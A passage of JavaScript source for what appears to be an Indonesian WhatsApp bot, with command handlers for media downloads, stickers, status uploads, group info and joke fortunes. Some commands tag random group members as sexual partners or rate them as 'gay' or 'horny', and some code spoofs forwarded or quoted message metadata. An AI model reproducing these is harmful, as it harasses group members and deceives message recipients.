break
           
           
           
           
          
                
               
                    
		
           
           
                    
        
                    
        case 'kata':         
                    if (args.length < 1) return reply(`[❗] Example :\n*${prefix}${command} anjayy cok hayukkkk&by nama kamu`)
			 	    var F = body.slice(6)
			        var F1 = F.split("&")[0];
			        var F2 = F.split("&")[1];
                    wert = await getBuffer(`https://api.xteam.xyz/quotemaker?text=${F1}&wm=${F2}&APIKEY=${xteam}`)
                    xdev.sendMessage(from, wert, image, {quoted: dev})
                    break
           
           
           
           
           
                         
		
				
                
           
           
           
           
           
           case 'waifu':
       case 'loli':
       case 'husbu':
       case 'milf':
       case 'cosplay':
       case 'wallml':
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'🐤OWNER'},type:1}]
              imageMsg = ( await xdev.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await xdev.prepareMessageFromContent(from,{buttonsMessage},{quoted: dev})
              xdev.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           case 'storyig': 
              if(!q) return reply('Usernamenya?')
              hx.igstory(q)
             .then(async result => {
              for(let i of result.medias){
              if(i.url.includes('mp4')){
              let link = await getBuffer(i.url)
              xdev.sendMessage(from,link,video,{quoted: dev,caption: `Type : ${i.type}`})
              } else {
              let link = await getBuffer(i.url)
              xdev.sendMessage(from,link,image,{quoted: dev,caption: `Type : ${i.type}`})                  
}
}
});
              break
           
           
          
           
           
           
           
           
           
           
           
           
        
           
           
           
           
           
           
           
           
           
    case 'buttons1':
               jawab('*Donwloading...*')
              if (args.length < 1) return reply('Link Nya Mana?')
              if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Error')
              teks = args.join(' ')
              res = await y2mateA(teks)
              sendFileFromUrl(res[0].link, document, {quoted: dev, mimetype: 'audio/mp3', filename: res[0].output})
              break
     case 'buttons2':
              jawab('*Donwloading...*')
              if (args.length < 1) return reply('Link Nya Mana?')
              if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
              teks = args.join(' ')
              res = await y2mateV(teks)
              sendFileFromUrl(res[0].link, document, {quoted: dev, mimetype: 'video/mp4', filename: res[0].output})
              break
       
             
           
           
           
           
           
           
           
        
        case 'attp':
              if (args.length == 0) return reply(`Example: ${prefix + command} YUxdev`)
              buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
              xdev.sendMessage(from, buffer, sticker, { quoted: dev })
              break
           
           //By yudha perdana
           case 'wangy':
              if (!q) return jawab('query')
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              xdev.sendMessage(from, awikwok, text)
              break
           
           
           
 case 'yts':
       case 'ytsearch1':
              if (!q) return jawab('Format salah')
              jawab('Tunggu sebentar')
              try {
              res = await yts(q)
              a = `*Youtube Search 🔎*\n`
for (let i of res.all) {
a += `
📜 Title : ${i.title}
🎞️ Views : ${i.views}
🌐 Upload : ${i.ago}
⏱️ Durasi : ${i.timestamp}
🎥 Channel : ${i.author.name}
🖇️ Link : ${i.url}\n\n`
}
               b = a.trim()
               sendFileFromUrl(res.all[0].image, image, {quoted: dev, thumbnail: Buffer.alloc(0), caption: b, contextInfo: forward})
               } catch (e) {
               console.log(e)
               reply(`${e}`)
}
               break
           
           
           
           
           
 case 'play2':
               if (wait === true) return sendSticker(spam2, sticker)
              wait = true
               if (args.length < 1) return jawab('Apa Yang Mau Dicari?')
               teks = args.join(' ')
               jawab('Tunggu bentar kak')
               
               if (!teks.endsWith("-doc")){
               res = await yts(`${teks}`).catch(e => {
               reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
               //jawab(`•♫•♬• Playing ${res.all[0].title} •♬•♫•`)
               let thumbInfo = `*Youtube Audio Downloader*
               
📜 Judul : ${res.all[0].title}
🎁 Type : mp3
📬 ID : ${res.all[0].videoId}
🌐 Publikasi : ${res.all[0].ago}
🎞️ Ditonton : ${res.all[0].views}
⚖️ Durasi : ${res.all[0].timestamp}
🎥 Channel : ${res.all[0].author.name}
🖇️ Link : ${res.all[0].author.url}

*_Harap tunggu sebentar, file akan segera dikirim_*`

               sendFileFromUrl(res.all[0].image, image, {quoted: dev, thumbnail: Buffer.alloc(0), caption: thumbInfo})
               res = await y2mateA(res.all[0].url).catch(e => {
               jawab('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
               sendFileFromUrl(res[0].link, audio, {quoted: dev, mimetype: 'audio/mp4', filename: res[0].output})
}
               if (teks.endsWith("-doc")){
               const tec = teks.split("-doc")
               res = await yts(`${tec}`).catch(e => {
               reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
               //jawab(`•♫•♬• Playing ${res.all[0].title} •♬•♫•`)
               let thumbInfo = `*Youtube Audio Downloader*
               
📜 Judul : ${res.all[0].title}
🎁 Type : mp3
📬 ID : ${res.all[0].videoId}
🌐 Publikasi : ${res.all[0].ago}
🎞️ Ditonton : ${res.all[0].views}
⚖️ Durasi : ${res.all[0].timestamp}
🎥 Channel : ${res.all[0].author.name}
🖇️ Link : ${res.all[0].author.url}

*_Harap tunggu sebentar, file akan segera dikirim_*`

               sendFileFromUrl(res.all[0].image, image, {quoted: dev, thumbnail: Buffer.alloc(0), caption: thumbInfo})
               res = await y2mateA(res.all[0].url).catch(e => {
               jawab('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
               sendFileFromUrl(res[0].link, document, {quoted: dev, mimetype: 'audio/mp3', filename: res[0].output})
}
setTimeout( () => {
                    wait = false
                    },10000)
               break
           
           
case 'upswlokasi':
                       if (!isOwner) return 
                       if (args.length < 1) return reply('Teksnya?')
                       teks = body.slice(12)
                       xdev.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`crewbot2`}, MessageType.location)
                       reply(`Sukses upload lokasi:\n${teks}`)
                       break	
                       
case 'upswsticker':
                        if (!isOwner) return 
                        if (!isQuotedSticker) return reply('Reply stikernya!')
                        if (isMedia && !dev.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						xdev.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                    
case 'upswaudio':
                        if (!isOwner) return 
                        if (!isQuotedAudio) return reply('Reply audionya!')
                        if (isMedia && !dev.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						xdev.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 999999999})
						}
						reply(`Sukses upload audio`)
						break
						
case 'upswvoice':
                        if (!isOwner) return 
                        if (!isQuotedAudio) return reply('Reply audionya!')
                        if (isMedia && !dev.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						xdev.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 999999999, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
						

                        
case 'upswgif':
                   if (!isOwner) return reply(mess.only.ownerB)
                    var konti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await xdev.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    xdev.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                     break
           
           case 'd':
				case 'del':
				case 'delete':
					xdev.deleteMessage(from, { id: dev.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
           
           
           
           
				
		case 'infogc':
           case 'infogrup':
            case 'infogroup':
            case 'grupinfo':
            case 'groupinfo':
                if (!isGroup) return reply('Hanya bisa di dalam group')
                 
                try {
                    var pic = await xdev.getProfilePicture(from)
                } catch {
                    var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
                }
                
                let ingfo = `
*G R O U P I N F O*
*Name :* ${groupName}
*ID Grup :* ${from}
*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
*Jumlah Admin :* ${groupAdmins.length}
*Jumlah Peserta :* ${groupMembers.length}
*AntiLink :* ${isAntiLink ? 'Aktif' : 'Mati'}
*AntiViewOnce :* ${isAntiviewonce ? 'Aktif' : 'Mati'}
*AntiBadword :* ${Toxic ? 'Aktif' : 'Mati'}
*Antibuggc :* ${Antibuggc ? 'Aktif' : 'Mati'}
*Antitroli :* ${antibugtroli ? 'Aktif' : 'Mati'}
*Antiasing :* ${isKickarea ? 'Aktif' : 'Mati'}
*Antivirtex :* ${AntiVirtex ? 'Aktif' : 'Mati'}
*Desc :* \n${groupMetadata.desc}`
                xdev.sendMessage(from, ingfo, text, {
                    'contextInfo': {  
                        'text': '🔥',
                        'forwardingScore': 10000000,
                        'isForwarded': true,
                        'sendEphemeral': true,
                        'externalAdReply': {
                            'title':`${groupName}`,
                            'body': '',
                            'previewType': 'PHOTO',
                           
                            'thumbnail': await getBuffer(pic),
                            'sourceUrl': ''
                        }
                    }
             })
                break
           
                            
                          
           
           
           
           
           case 'jadian':
					jds = []
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  @${diaa.jid.split('@')[0]} `
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					mentions(teks, jds, true)
					break
	
case 'ngewe':
					jds = []
					const jdiid = groupMembers
					const kosst = groupMembers
					const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
					const diaat = kosst[Math.floor(Math.random() * kosst.length)]
					teks = `Yang ngewe kemarin di grub ini adalah @${akuut.jid.split('@')[0]} dan @${diaat.jid.split('@')[0]} `
					jds.push(akuut.jid)
					jds.push(diaat.jid)
					mentions(teks, jds, true)
					break
           
           
				
case 'artimimpi':   
                if (args.length < 1) return reply('mimpa apa emang ?')
				reply('Tunggu bentar kak')
				aw = body.slice(10)
				wows = await fetchJson(`https://api.zeks.xyz/api/artimimpi?q=${aw}&apikey=${zeks}`, {method: 'get'})
				judul = `${wows.result.string}\n ${wows.result.array}`
				xdev.sendMessage(from, judul, text, {quoted: dev,})
				break
				
case 'artinama':   
                if (args.length < 1) return reply('namanya ?')
				reply('Tunggu bentar kak')
				aw = body.slice(9)
				awu = await fetchJson(`https://api.zeks.xyz/api/artinama?nama=${aw}&apikey=${zeks}`, {method: 'get'})
				judul = `${awu.result}`
				xdev.sendMessage(from, judul, text, {quoted: dev,})
				break
					             

				

			
case 'lolhumancek':
case 'cekapi':

                   anunye = await fetchJson(`http://api.lolhuman.xyz/api/checkapikey?apikey=${lolKey}`)
  nganu = `
❒ *Username :* ${anunye.result.username}
❒ *Sisa Limit :* ${anunye.result.requests}
❒ *Type :* ${anunye.result.account_type}
❒ *Expired :* ${anunye.result.expired}` 
                   reply(nganu)
                   break

           
           
 
           
           case 'diem':
			    if (!isOwner) return reply('*Ga mau* 🤨')
			    if (!isGroup) return 
                if (isMuted) return reply(`*aku udah diem nih*`)
                mute.push(from)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                sendFakeStatus(from, `*Baik kak* 😥 `, fake)
                break
                
                case 'udah':
            if (!isOwner) return reply('*Bodo* 😒')
			    if (!isGroup) return 
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                sendFakeStatus(from, `*Oke kak* 😁`, fake)
            break
					
           
           
         
           
           
           
           case 'katailham':  
                     const kta =['Lebih baik mengerti sedikit daripada salah mengerti.',
'Hampir semua pria memang mampu bertahan menghadapi kesulitan. Namun, jika Anda ingin menguji karakter sejati pria, beri dia kekuasaan.',
'Bila tekad seseorang kuat dan teguh, Tuhan akan bergabung dalam usahanya.',
'Penderitaan adalah pelajaran.',
'Ilmu pengetahuan tanpa agama adalah pincang.',
'Hidup itu seperti sebuah sepeda, agar tetap seimbang kita harus tetap bergerak.',
'Perbedaan masa lalu, sekarang, dan masa depan tak lebih dari ilusi yang keras kepala.',
'Sebuah meja, sebuah kursi, semangkuk buah, dan sebuah biola; apa lagi yang dibutuhkan agar seseorang bisa merasa bahagia?',
'Belas kasihanlah terhadap sesama, bersikap keraslah terhadap diri sendiri.',
'Cara paling baik untuk menggerakkan diri Anda ialah memberi tugas kepada diri sendiri.',
'Kita tidak boleh kehilangan semangat. Semangat adalah stimulan terkuat untuk mencintai, berkreasi dan berkeinginan untuk hidup lebih lama.',
'Manusia akan bahagia selama ia memilih untuk bahagia.','Saya tidak berharap menjadi segalanya bagi setiap orang. Saya hanya ingin menjadi sesuatu untuk seseorang.',
'Apabila sempurna akal seseorang, maka sedikit perkataannya.','Bahagialah orang yang dapat menjadi tuan untuk dirinya, menjadi kusir untuk nafsunya dan menjadi kapten untuk bahtera hidupnya.',
'Sahabat yang jujur lebih besar harganya daripada harta benda yang diwarisi dari nenek moyang.','Yang paling melelahkan dalam hidup adalah menjadi orang yang tidak tulus.',
'Terbuka untuk Anda, begitulah Tuhan memberi kita jalan untuk berusaha. Jangan pernah berfikir jalan sudah tertutup.',
'Penundaan adalah kuburan dimana peluang dikuburkan.','Cinta bukan saling menatap mata, namun melihat ke arah yang sama bersama-sama.',
'Kita adalah apa yang kita kerjakan berulang kali. Dengan demikian, kecemerlangan bukan tindakan, tetapi kebiasaan.',
'Jangan pernah mencoba menjadikan putra atau putri Anda menjadi seperti Anda. Diri Anda hanya cukup satu saja.',
'Jika Anda bisa membuat orang lain tertawa, maka Anda akan mendapatkan semua cinta yang Anda inginkan.',
'Masalah akan datang cepat atau lambat. Jika masalah datang, sambut dengan sebaik mungkin. Semakin ramah Anda menyapanya, semakin cepat ia pergi.',
'Kita tak bisa melakukan apapun untuk mengubah masa lalu. Tapi apapun yang kita lakukan bisa mengubah masa depan.',
'Kesabaran adalah teman dari kebijaksanaan.','Orang-orang kreatif termotivasi oleh keinginan untuk maju, bukan oleh keinginan untuk mengalahkan orang lain.',
'Dimanapun engkau berada selalulah menjadi yang terbaik dan berikan yang terbaik dari yang bisa kita berikan.',
'Kebencian seperti halnya cinta, berkobar karena hal-hal kecil.',
'Anda tidak perlu harus berhasil pada kali pertama.',
'Satu jam yang intensif, jauh lebih baik dan menguntungkan daripada bertahun-tahun bermimpi dan merenung-renung.',
'Hal terbaik yang bisa Anda lakukan untuk orang lain bukanlah membagikan kekayaan Anda, tetapi membantu dia untuk memiliki kekayaannya sendiri.',
'Tidak ada jaminan keberhasilan, tetapi tidak berusaha adalah jaminan kegagalan.',
'Aku tidak tahu kunci sukses itu apa, tapi kunci menuju kegagalan adalah mencoba membuat semua orang senang.']
					const su = kta[Math.floor(Math.random() * kta.length)]
					xdev.sendMessage(from, ''+su+'\n\n_-Ilham._', text, { quoted: dev })
					break
					
					case 'bucin':
					const sa = bucin[Math.floor(Math.random() * bucin.length)]
					xdev.sendMessage(from, ''+sa+'\n\n_-BUCIN._', text, { quoted: dev })
					break
           
 case 'bisakah':
					bisakah = body.slice(1)
					const bisa =['BISA','Tidak Bisa','Oh tentu saja bisa dong','Udah dari lahir dia bisa kaya gitu kak 😄','Oh tentu saja tidak bisa','Wuih bisa bisa','Ga mao jawab ah kaka wibu','Tentu saja bisa eh tapi boong awokawok 🤣','Engga engga dia ga bisa','Enggaklah','Aku ga mao jawbab 🙂','Rahasia dong 😂']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: dev })
					break

case 'kapankah':
					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: dev })
					break
					
case 'apakah':
					apakah = body.slice(1)
					const apa =['iya dong jelas itu','Tidak lah','Oh tentu saja tidak','Ya mana saya tau kok tanya saya','Rahasia dong','ga usah di tanya emang udah kaya gitu dia','Au ah mending mandi','Bentar aku lagi berak','Knpa emang kamu suka sama dia yak ??','Haha mna mungkin 🤣']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: dev })
					break
					
case 'bagaimanakah':
					bagaimanakah = body.slice(1)
					const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Gua tabok boleh ?','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan','Hah kamu tanya sama aku trus aku tanya ke siapa dong','Whahahaha ga tau 😑']
					const mana = bagai[Math.floor(Math.random() * bagai.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: dev })
					break
					
case 'rate':
					rate = body.slice(1)
					const ra =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: dev })
					break
					
case 'sangecek':
					sange = body.slice(1)
					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const nge = sang[Math.floor(Math.random() * sang.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+sange+'*\n\nJawaban : '+ nge+'%', text, { quoted: dev })
					break
					
case 'gaycek':
					gayy = body.slice(1)
					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const yag = gay[Math.floor(Math.random() * gay.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+gayy+'*\n\nJawaban : '+ yag+'%', text, { quoted: dev })
					break
					
case 'lesbicek':
					lesbii = body.slice(1)
					const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const bo = lesbi[Math.floor(Math.random() * lesbi.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+lesbii+'*\n\nJawaban : '+ bo+'%', text, { quoted: dev })
					break
					
case 'gantengcek':
					ganteng = body.slice(1)
					const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+ganteng+'*\n\nJawaban : '+ teng+'%', text, { quoted: dev })
					break
					
case 'cantikcek':
					cantik = body.slice(1)
					const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+cantik+'*\n\nJawaban : '+ tik+'%', text, { quoted: dev })
					break
					
case 'watak':
					watak = body.slice(1)
					const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					const tak = wa[Math.floor(Math.random() * wa.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, text, { quoted: dev })
					break
				
case 'hobby':
					hobby = body.slice(1)
					const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: dev })
					break
					

           
           
           
           
           
           case 'video1':   
           if(wait === true) return reply('Bentar blom selesai nih')
		reply('Tunggu bentar kak')
                wait = true
                
                 if (isBanned) return 
				play = body.slice(6)
				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play}&apikey=${zeks}`)
				if (anu.error) return reply(anu.error) 
				infomp3 = `*Lagu Ditemukan!!!*\nJudul : ${anu.result.title}\nSource : ${anu.result.source}\nUkuran : ${anu.result.size}\n\n*TUNGGU SEBENTAR LAGI DIKIRIM MOHON JANGAN SPAM YA SAYANG*`
				buffer = await getBuffer(anu.result.thumbnail)
				xdev.sendMessage(from, buffer, image, {quoted: dev, caption: infomp3})
				lagu = await getBuffer(anu.result.url_audio)
				xdev.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: xdev})
				wait = false
				break
           
           
           case 'play1':   
                if(wait === true) return reply('Bentar blom selesai nih')
                reply('Tunggu bentar kak')
                wait = true
				putar = args.join(" ")
				get_result = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3/2?q=${putar}&apikey=${zeks}`)
				infomp3 = `*Lagu Ditemukan!!!*\nJudul : ${get_result.result.title}\nSource : ${get_result.result.source}\nUkuran : ${get_result.result.size}\n\n *TUNGGU SEBENTAR LAGI DIKIRIM*`
				buffer = await getBuffer(get_result.result.thumb)
				xdev.sendMessage(from, buffer, image, {quoted: dev, caption: infomp3})
				lagu = await getBuffer(get_result.result.link)
				xdev.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${get_result.result.title}.mp3`, quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./stik/vn.jpeg`)},"title": `${pushname}`,"description": `「 audio 」 ${putar}`, "retailerId": `「 audio 」 ${putar}`,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}, ptt: true, contextInfo: forward})
				wait = false
				break
           
           
           case 'getppgc':
					if (!isGroup) return 
					ahenak = from
		if (`${ahenak}@g.us`) {
		try {
					ppimg = await xdev.getProfilePicture(ahenak)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				metadete = await xdev.groupMetadata(ahenak)
				uh = await xdev.getProfilePicture(ahenak)
				buffer = await getBuffer(uh)
				xdev.sendMessage(from, buffer, image, {quoted: dev})
		} 
  break
           
           case 'chat':
           if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
			if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
            if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
		
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            xdev.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
           
           case 'out':
				if (!isGroup) return 
				    if (!isOwner) return sendSticker(gaboleh, sticker)
				xdev.groupLeave(from)
						break
						
						
						
						case 'reportbug':
						case 'bugreport':
						case 'laporbug':
						if(!q) return reply(`Masukan laporan bug dengan teks atau reply gambar screenshot dengan teks\nLaporan yang main-main tidak akan di tanggapi`)
						if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						if(!q) return reply("Masukan laporan bug yang di alami")
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
							await xdev.sendMessage(`6285156137901@s.whatsapp.net`, buff, image, { caption: `*「 Laporan Bug 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${q}\n\n\n                             ${calender}\n` })
							await xdev.modifyChat(`6285156137901@s.whatsapp.net`, ChatModification.delete)
							await xdev.sendMessage(from,"Laporan bug telah dikirim",text)
					    } else {
							await xdev.sendMessage(`6285156137901@s.whatsapp.net`,`*「 Laporan Bug 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${q}\n\n\n                             ${calender}\n`,text)
						    await xdev.modifyChat(`6285156137901@s.whatsapp.net`, ChatModification.delete)
						    await xdev.sendMessage(from,"Laporan bug telah dikirim",text)
					        }
					       break
						
						
						
						
						
						
						
						
						case 'tts':	
					if (args.length < 1) return reply('Kode bahasanya mana kak?')
					if (args.length < 2) return reply('Textnya mana kak?')
					const gtts = require('./lib/gtts')(args[0])
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					dtt.length > 600
					? reply('Textnya kebanyakan kak')
					: gtts.save(ranm, dtt, function() {
						xdev.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: dev, mimetype: 'audio/mp4', ptt:true})
						fs.unlinkSync(ranm)
					})
					
					break
						
						
				
						
           
           
           
           
           
           



           
           case 'clearall':
                if (!isOwner) return sendSticker(gaboleh, sticker)
                    list_chat = await xdev.chats.all()
                    for (let chat of list_chat) {
                        xdev.modifyChat(chat.jid, "delete")
                    }
                    setTimeout( () => {
          sendMess("success clear all chat")
          },3000)
                    
                    break
           
           
           
           case 'public':
               if (!isOwner) return sendSticker(gaboleh, sticker)
